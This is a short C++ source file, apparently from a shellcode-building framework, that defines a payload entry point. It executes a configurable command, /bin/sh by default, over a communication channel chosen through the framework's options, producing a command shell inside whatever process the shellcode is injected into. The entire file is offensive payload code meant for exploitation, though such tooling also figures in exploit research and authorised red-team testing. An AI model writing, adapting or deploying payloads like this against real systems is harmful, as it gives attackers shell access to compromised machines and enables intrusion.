#include <factory.h>
#include <channel.h>

using namespace Pico;

#ifndef COMMAND
#define COMMAND /bin/sh
#endif

SHELLCODE_ENTRY
{
    /* Command to execute. */
    const char *cmd = TO_STRING(COMMAND);

#if (SET_ARGV0 == 1)
    char *const argv[] = { (char *) cmd, NULL };
#else
    char **const argv = nullptr;
#endif

    auto channel = Options::channel();

    Process::execute(channel, cmd, argv);
}
